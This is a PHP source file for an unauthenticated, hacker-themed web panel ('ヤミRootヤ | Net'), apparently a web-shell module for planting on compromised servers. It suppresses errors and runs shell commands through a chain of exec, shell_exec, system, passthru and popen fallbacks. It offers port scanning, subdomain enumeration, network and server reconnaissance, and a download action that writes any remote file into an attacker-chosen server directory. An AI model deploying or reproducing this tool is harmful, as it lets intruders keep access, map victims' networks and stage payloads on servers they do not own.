<?php
session_start();
@error_reporting(0);
@set_time_limit(0);
ini_set('memory_limit', '256M');
header('Content-Type: text/html; charset=UTF-8');
ob_end_clean();

$title = "ヤミRootヤ | Net";
$author = "0x6ick";
$bg = "#0a0a0f";
$fg = "#E0FF00"; 
$pink = "#FF00C8";
$cyan = "#00FFF7";
$purple = "#7D00FF";
$input_bg = "#120024";
$input_fg = "#00FFB2";
$font = "'Fira Code', monospace";

// --- CORE UTILITIES ---

function exe($cmd) {
    $output = '';
    if (function_exists('exec')) {
        @exec($cmd . ' 2>&1', $output_arr);
        return implode("\n", $output_arr);
    } elseif (function_exists('shell_exec')) {
        $output = @shell_exec($cmd . ' 2>&1');
        return $output ?: "shell_exec output empty";
    } elseif (function_exists('system')) {
        ob_start();
        @system($cmd . ' 2>&1');
        return ob_get_clean();
    } elseif (function_exists('passthru')) {
        ob_start();
        @passthru($cmd . ' 2>&1');
        return ob_get_clean();
    } elseif (is_resource($f = @popen($cmd, "r"))) {
        $o = "";
        while (!@feof($f)) $o .= @fread($f, 1024);
        @pclose($f);
        return $o;
    }
    return "All execution functions disabled.";
}

function getServerInfo() {
    $system_data['user_ip'] = $_SERVER['REMOTE_ADDR'] ?? 'N/A';
    $system_data['host'] = $_SERVER['HTTP_HOST'] ?? 'N/A';
    $system_data['server_name'] = $_SERVER['SERVER_NAME'] ?? 'N/A';
    $system_data['os'] = php_uname() ?? 'N/A';
    $system_data['php_version'] = PHP_VERSION ?? 'N/A';
    return $system_data;
}


// --- NETWORK TOOL FUNCTIONS ---

function pingHost($host) {
    $host = escapeshellarg($host);
    return exe((strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? "ping -n 4 $host" : "ping -c 4 $host");
}

function portScanPHP($host, $ports) {
    $output = "";
    $port_array = (strpos($ports, '-') !== false) ? range(...array_map('intval', explode('-', $ports))) : array_map('intval', explode(',', $ports));
    foreach ($port_array as $port) {
        if ($port > 0 && $port < 65536) {
            $conn = @fsockopen($host, $port, $errno, $errstr, 3);
            $status = is_resource($conn) ? "OPEN (" . (getservbyport($port, 'tcp') ?: 'unknown') . ")" : "CLOSED";
            if (is_resource($conn)) fclose($conn);
            $output .= "Port $port: $status\n";
        }
    }
    return $output;
}

function portScan($host, $ports) {
    $host_arg = escapeshellarg($host);
    $ports_arg = escapeshellarg($ports);
    if (strpos(exe("which nmap"), 'nmap') !== false) {
        return exe("nmap -p $ports_arg $host_arg");
    } elseif (strpos(exe("which nc"), 'nc') !== false) {
        $output = "";
        foreach (explode(',', str_replace('-', ',', trim($ports, "'"))) as $port) {
            if (is_numeric($port)) {
                $result = exe("nc -z -v $host_arg $port 2>&1");
                $output .= "Port $port: " . (strpos($result, 'succeeded') !== false ? "OPEN" : "CLOSED") . "\n";
            }
        }
        return $output;
    } else {
        return portScanPHP($host, $ports);
    }
}

function dnsLookupPHP($domain, $type = 'A') {
    $output = "";
    $type_map = ['A' => DNS_A, 'MX' => DNS_MX, 'NS' => DNS_NS, 'TXT' => DNS_TXT];
    $php_type = $type_map[strtoupper($type)] ?? DNS_ALL;
    $records = @dns_get_record($domain, $php_type);
    
    if ($records) {
        foreach ($records as $record) {
            if ($record['type'] == 'A') $output .= "A Record: {$record['ip']}\n";
            if ($record['type'] == 'MX') $output .= "MX Record: {$record['target']} (Priority: {$record['pri']})\n";
            if ($record['type'] == 'NS') $output .= "NS Record: {$record['target']}\n";
            if ($record['type'] == 'TXT') $output .= "TXT Record: {$record['txt']}\n";
        }
    }
    return $output ?: "No DNS records found";
}

function dnsLookup($domain, $type = 'A') {
    $domain_arg = escapeshellarg($domain);
    $type_arg = escapeshellarg($type);
    if (strpos(exe("which dig"), 'dig') !== false) {
        return exe("dig $domain_arg $type_arg");
    } elseif (strpos(exe("which nslookup"), 'nslookup') !== false) {
        return exe("nslookup -type=$type_arg $domain_arg");
    } else {
        return dnsLookupPHP($domain, $type);
    }
}

function whoisLookup($domain) {
    $domain_arg = escapeshellarg($domain);
    if (strpos(exe("which whois"), 'whois') !== false) {
        return exe("whois $domain_arg");
    } elseif (strpos(exe("which jwhois"), 'jwhois') !== false) {
        return exe("jwhois $domain_arg");
    }
    return "whois command not found.";
}

function httpHeaderCheck($url) {
    if (!filter_var($url, FILTER_VALIDATE_URL)) return "Invalid URL";
    $url_arg = escapeshellarg($url);
    if (strpos(exe("which curl"), 'curl') !== false) {
        return exe("curl -I " . $url_arg);
    } else {
        $headers = @get_headers($url, 0, stream_context_create(["http" => ["method" => "HEAD", "timeout" => 10]]));
        return $headers ? implode("\n", $headers) : "Failed to retrieve headers";
    }
}

function curlDownload($url, $path) {
    if (!filter_var($url, FILTER_VALIDATE_URL)) return "Invalid URL";
    $filename = basename(parse_url($url, PHP_URL_PATH)) ?: 'download_' . time();
    $fullpath = $path . DIRECTORY_SEPARATOR . $filename;
    $url_arg = escapeshellarg($url);
    $fullpath_arg = escapeshellarg($fullpath);
    if (strpos(exe("which curl"), 'curl') !== false) {
        return exe("curl -L " . $url_arg . " -o " . $fullpath_arg);
    } elseif (strpos(exe("which wget"), 'wget') !== false) {
        return exe("wget " . $url_arg . " -O " . $fullpath_arg);
    } else {
        $content = @file_get_contents($url, false, stream_context_create(["http" => ["timeout" => 30]]));
        if ($content !== false && @file_put_contents($fullpath, $content)) {
            return "Downloaded to: $fullpath (" . filesize($fullpath) . " bytes)";
        }
        return "Download failed";
    }
}

function tracerouteHost($host) {
    $host = escapeshellarg($host);
    if (strpos(exe("which traceroute"), 'traceroute') !== false) {
        return exe("traceroute $host");
    } elseif (strpos(exe("which tracepath"), 'tracepath') !== false) {
        return exe("tracepath $host");
    }
    return "traceroute command not found";
}

function networkStats() {
    $output = "Network Statistics:\n\n";
    
    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
        $output .= "=== Network Interfaces (ipconfig) ===\n";
        $output .= exe("ipconfig");
        $output .= "\n\n=== Active Connections (netstat) ===\n";
        $output .= exe("netstat -an");
        
    } else {
        $output .= "=== Network Interfaces (ifconfig / ip addr show) ===\n";
        $interface_output = exe("ifconfig");
        if (empty(trim($interface_output)) || strpos($interface_output, 'command not found') !== false) {
             $interface_output = exe("ip addr show");
        }
        $output .= $interface_output;

        $output .= "\n\n=== Routing Table (route -n / ip route show) ===\n";
        $output .= exe("route -n") ?: exe("ip route show") ?: "No CMD utility available.";
        
        $output .= "\n\n=== Active Connections (netstat / ss) ===\n";
        $netstat_output = exe("netstat -tuln");
        if (empty(trim($netstat_output)) || strpos($netstat_output, 'command not found') !== false) {
            $netstat_output = exe("ss -tuln");
        }
        $output .= $netstat_output ?: "No CMD utility available.";
    }
    
    return $output;
}

function reverseDNS($ip) {
    $ip = escapeshellarg($ip);
    if (strpos(exe("which dig"), 'dig') !== false) {
        return exe("dig -x $ip");
    } elseif (strpos(exe("which nslookup"), 'nslookup') !== false) {
        return exe("nslookup $ip");
    } else {
        $hostname = @gethostbyaddr($ip);
        return $hostname ? "Reverse DNS: $ip -> $hostname" : "No reverse DNS record";
    }
}

function subdomainScan($domain) {
    $domain = trim(escapeshellarg($domain), "'");
    $subs = ['www', 'mail', 'ftp', 'admin', 'blog', 'dev', 'api', 'shop', 'forum', 'portal'];
    $output = "";
    foreach ($subs as $sub) {
        $full = "$sub.$domain";
        $ip = @gethostbyname($full);
        if ($ip !== $full) $output .= "$full -> $ip\n";
    }
    return $output ?: "No common subdomains found";
}

// --- FORM INPUT PROCESSING ---
$action = $_GET['action'] ?? 'ping';
$path = $_GET['path'] ?? getcwd(); 
$output = '';

$server_info = getServerInfo(); // Get server info once

if (isset($_POST['do_tool'])) {
    $target_host = $_POST['target_host'] ?? '';
    $ports = $_POST['ports'] ?? '';
    $target_domain = $_POST['target_domain'] ?? '';
    $record_type = $_POST['record_type'] ?? 'A';
    $target_url = $_POST['target_url'] ?? '';
    $url = $_POST['url'] ?? '';
    $target_ip = $_POST['target_ip'] ?? '';

    switch ($action) {
        case 'ping': $output = pingHost($target_host); break;
        case 'portscan': $output = portScan($target_host, $ports); break;
        case 'dnslookup': $output = dnsLookup($target_domain, $record_type); break;
        case 'whois': $output = whoisLookup($target_domain); break;
        case 'header': $output = httpHeaderCheck($target_url); break;
        case 'curl': $output = curlDownload($url, $path); break;
        case 'traceroute': $output = tracerouteHost($target_host); break;
        case 'netstat': $output = networkStats(); break; 
        case 'reverse': $output = reverseDNS($target_ip); break;
        case 'subscan': $output = subdomainScan($target_domain); break;
    }
}
?>
<!DOCTYPE HTML>
<html>
<head>
<link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap" rel="stylesheet">
<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" rel="stylesheet">
<title><?php echo htmlspecialchars($title); ?></title>
<style>
/* Fira Code is used */
*{box-sizing:border-box;margin:0;padding:0;font-family:<?php echo $font; ?>} 
body{background:<?php echo $bg; ?>;color:<?php echo $fg; ?>;min-height:100vh;padding:20px;background-image:repeating-linear-gradient(0deg,transparent,transparent 2px,#11111a 2px,#11111a 4px)}
.container{max-width:1200px;margin:0 auto}
.glitch{text-align:center;font-size:30px;color:white;margin:10px 0 20px;position:relative;text-transform:uppercase;letter-spacing:3px}
.glitch:before,.glitch:after{content:attr(data-text);position:absolute;top:0;left:0;width:100%;height:100%}
.glitch:before{left:2px;text-shadow:-2px 0 <?php echo $pink; ?>;clip:rect(44px,450px,56px,0);animation:ga 5s infinite linear alternate-reverse}
.glitch:after{left:-2px;text-shadow:-2px 0 <?php echo $cyan; ?>;clip:rect(44px,450px,56px,0);animation:ga 3s infinite linear alternate-reverse}
@keyframes ga{0%{clip:rect(32px,9999px,28px,0)}5%{clip:rect(13px,9999px,37px,0)}10%{clip:rect(40px,9999px,39px,0)}15%{clip:rect(14px,9999px,62px,0)}20%{clip:rect(63px,9999px,14px,0)}25%{clip:rect(43px,9999px,28px,0)}30%{clip:rect(24px,9999px,78px,0)}35%{clip:rect(52px,9999px,56px,0)}40%{clip:rect(79px,9999px,89px,0)}45%{clip:rect(60px,9999px,69px,0)}50%{clip:rect(38px,9999px,29px,0)}55%{clip:rect(26px,9999px,54px,0)}60%{clip:rect(42px,9999px,90px,0)}65%{clip:rect(15px,9999px,85px,0)}70%{clip:rect(48px,9999px,61px,0)}75%{clip:rect(73px,9999px,74px,0)}80%{clip:rect(8px,9999px,13px,0)}85%{clip:rect(76px,9999px,48px,0)}90%{clip:rect(19px,9999px,59px,0)}95%{clip:rect(26px,9999px,80px,0)}100%{clip:rect(59px,9999px,30px,0)}}
.menu{display:flex;flex-wrap:wrap;justify-content:center;gap:5px;margin:20px 0;padding:15px;background:#11111a;border:2px solid <?php echo $purple; ?>;border-radius:8px;box-shadow:0 0 15px rgba(125,0,255,0.6)}
.menu a{padding:10px 15px;color:<?php echo $cyan; ?>;text-decoration:none;border-radius:4px;transition:all 0.3s}
.menu a:hover{color:<?php echo $pink; ?>;background:rgba(255,0,200,0.1);transform:translateY(-2px)}
.menu a.active{background:<?php echo $cyan; ?>;color:<?php echo $bg; ?>;font-weight:bold;box-shadow:0 0 10px <?php echo $cyan; ?>}
.box{background:#11111a;margin:25px 0;padding:25px;border:2px solid <?php echo $purple; ?>;border-radius:12px;box-shadow:0 0 20px rgba(125,0,255,0.8)}
.header{color:<?php echo $pink; ?>;text-align:center;font-size:1.8em;margin-bottom:25px;text-transform:uppercase;letter-spacing:2px;border-bottom:2px solid <?php echo $purple; ?>;padding-bottom:15px}
.form-group{margin-bottom:20px}
.form-group label{display:block;margin-bottom:8px;font-size:0.95em;font-weight:bold;text-transform:uppercase;letter-spacing:1px}
input[type="text"],select{width:100%;padding:12px;background:<?php echo $input_bg; ?>;color:<?php echo $input_fg; ?>;border:2px solid <?php echo $purple; ?>;border-radius:4px;font-size:1em;transition:all 0.3s}
input[type="text"]:focus,select:focus{border-color:<?php echo $cyan; ?>;box-shadow:0 0 15px <?php echo $cyan; ?>;outline:none}
input[type="submit"]{width:100%;padding:14px;background:linear-gradient(45deg,<?php echo $pink; ?>,<?php echo $purple; ?>);color:#000;font-weight:bold;border:none;border-radius:4px;cursor:pointer;transition:all 0.3s;font-size:1.1em;text-transform:uppercase;letter-spacing:2px;box-shadow:0 0 15px rgba(255,0,200,0.7)}
input[type="submit"]:hover{background:linear-gradient(45deg,<?php echo $cyan; ?>,<?php echo $pink; ?>);box-shadow:0 0 25px <?php echo $cyan; ?>;transform:translateY(-3px)}
pre{background:#000;border:2px solid <?php echo $input_fg; ?>;padding:20px;overflow-x:auto;white-space:pre-wrap;color:<?php echo $input_fg; ?>;border-radius:5px;margin-top:25px;box-shadow:0 0 15px rgba(0,255,178,0.4)}
.footer{text-align:center;padding:20px;font-size:0.9em;color:<?php echo $fg; ?>}
/* NEW CSS FOR INFO BOX */
.info-box {
    background: #11111a;
    border: 2px solid <?php echo $purple; ?>;
    border-radius: 8px;
    padding: 15px;
    margin-bottom: 25px;
    box-shadow: 0 0 10px rgba(125,0,255,0.4);
    font-size: 0.95em;
    line-height: 1.6;
}
.info-box table {
    width: 100%;
    border-collapse: collapse;
}
.info-box td {
    padding: 3px 0;
}
.info-box i {
    color: <?php echo $cyan; ?>;
    margin-right: 8px;
}
.info-box .label {
    color: white; 
    font-weight: 700;
    width: 30%;
}
.info-box .value {
    color: <?php echo $fg; ?>;
}
@media(max-width:768px){.menu{flex-direction:column}.menu a{margin:3px 0}}
</style>
</head>
<body>
<div class="container">
<h1 class="glitch" data-text="<?php echo htmlspecialchars($title); ?>"><?php echo htmlspecialchars($title); ?></h1>

<div class="info-box">
    <table>
        <tr>
            <td class="label"><i class="fas fa-user"></i> User / IP</td>
            <td class="value">: <?php echo htmlspecialchars($server_info['user_ip']); ?></td>
        </tr>
        <tr>
            <td class="label"><i class="fas fa-desktop"></i> Host / Server</td>
            <td class="value">: <?php echo htmlspecialchars($server_info['host']) . " / " . htmlspecialchars($server_info['server_name']); ?></td>
        </tr>
        <tr>
            <td class="label"><i class="fas fa-microchip"></i> System / PHP</td>
            <td class="value">: <?php echo htmlspecialchars($server_info['os']) . " / v" . htmlspecialchars($server_info['php_version']); ?></td>
        </tr>
    </table>
</div>
<div class="menu">
<a href="?action=ping" class="<?php echo $action == 'ping' ? 'active' : ''; ?>"><i class="fas fa-bullseye"></i> Ping</a>
<a href="?action=portscan" class="<?php echo $action == 'portscan' ? 'active' : ''; ?>"><i class="fas fa-network-wired"></i> Port Scan</a>
<a href="?action=dnslookup" class="<?php echo $action == 'dnslookup' ? 'active' : ''; ?>"><i class="fas fa-dns"></i> DNS Lookup</a>
<a href="?action=whois" class="<?php echo $action == 'whois' ? 'active' : ''; ?>"><i class="fas fa-info-circle"></i> Whois</a>
<a href="?action=header" class="<?php echo $action == 'header' ? 'active' : ''; ?>"><i class="fas fa-heading"></i> HTTP Header</a>
<a href="?action=curl" class="<?php echo $action == 'curl' ? 'active' : ''; ?>"><i class="fas fa-download"></i> cURL Download</a>
<a href="?action=traceroute" class="<?php echo $action == 'traceroute' ? 'active' : ''; ?>"><i class="fas fa-route"></i> TraceRoute</a>
<a href="?action=netstat" class="<?php echo $action == 'netstat' ? 'active' : ''; ?>"><i class="fas fa-chart-network"></i> NetStat</a>
<a href="?action=reverse" class="<?php echo $action == 'reverse' ? 'active' : ''; ?>"><i class="fas fa-exchange-alt"></i> Reverse DNS</a>
<a href="?action=subscan" class="<?php echo $action == 'subscan' ? 'active' : ''; ?>"><i class="fas fa-search"></i> Sub Scan</a>
</div>
<div class="box">
<div class="header"><i class="fas fa-toolbox"></i> <?php echo ucwords(str_replace(['scan', 'dns'], [' Scan', 'DNS'], $action)); ?> Tool</div>

<?php if ($action == 'ping'): ?>
<form method="POST"><div class="form-group">
<label>Target Host</label>
<input type="text" name="target_host" placeholder="google.com" required>
</div><input type="submit" name="do_tool" value="Ping Host"></form>

<?php elseif ($action == 'portscan'): ?>
<form method="POST"><div class="form-group">
<label>Target Host</label>
<input type="text" name="target_host" placeholder="scanme.nmap.org" required>
</div><div class="form-group">
<label>Ports (e.g: 21,22,80,443 or 20-80)</label>
<input type="text" name="ports" placeholder="21,22,80,443" required>
</div><input type="submit" name="do_tool" value="START SCAN"></form>

<?php elseif ($action == 'dnslookup'): ?>
<form method="POST"><div class="form-group">
<label>Domain</label>
<input type="text" name="target_domain" placeholder="google.com" required>
</div><div class="form-group">
<label>Record Type</label>
<select name="record_type">
<option>A</option><option>MX</option><option>NS</option><option>TXT</option><option>ANY</option>
</select>
</div><input type="submit" name="do_tool" value="Lookup DNS"></form>

<?php elseif ($action == 'whois'): ?>
<form method="POST"><div class="form-group">
<label>Target Domain</label>
<input type="text" name="target_domain" placeholder="google.com" required>
</div><input type="submit" name="do_tool" value="Whois Lookup"></form>

<?php elseif ($action == 'header'): ?>
<form method="POST"><div class="form-group">
<label>Target URL</label>
<input type="text" name="target_url" placeholder="http://google.com" required>
</div><input type="submit" name="do_tool" value="Get Header"></form>

<?php elseif ($action == 'curl'): ?>
<form method="POST"><div class="form-group">
<label>File URL</label>
<input type="text" name="url" placeholder="https://example.com/file.txt" required>
</div><input type="submit" name="do_tool" value="Download Here"></form>

<?php elseif ($action == 'traceroute'): ?>
<form method="POST"><div class="form-group">
<label>Target Host</label>
<input type="text" name="target_host" placeholder="google.com" required>
</div><input type="submit" name="do_tool" value="Trace Route"></form>

<?php elseif ($action == 'netstat'): ?>
<form method="POST"><input type="submit" name="do_tool" value="Show Network Stats"></form>

<?php elseif ($action == 'reverse'): ?>
<form method="POST"><div class="form-group">
<label>Target IP</label>
<input type="text" name="target_ip" placeholder="8.8.8.8" required>
</div><input type="submit" name="do_tool" value="Reverse DNS Lookup"></form>

<?php elseif ($action == 'subscan'): ?>
<form method="POST"><div class="form-group">
<label>Target Domain</label>
<input type="text" name="target_domain" placeholder="google.com" required>
</div><input type="submit" name="do_tool" value="Scan Subdomains"></form>
<?php endif; ?>

<?php if(!empty($output)): ?>
<h4 style="color:<?php echo $cyan;?>;margin-top:25px;text-align:left;">Output:</h4>
<pre><?php echo htmlspecialchars($output); ?></pre>
<?php endif; ?>
</div>
<div class="footer">Coded With &#x1f497; by <span style="color:<?php echo $purple;?>"><?php echo htmlspecialchars($author); ?></span></div>
</div>
</body>
</html>
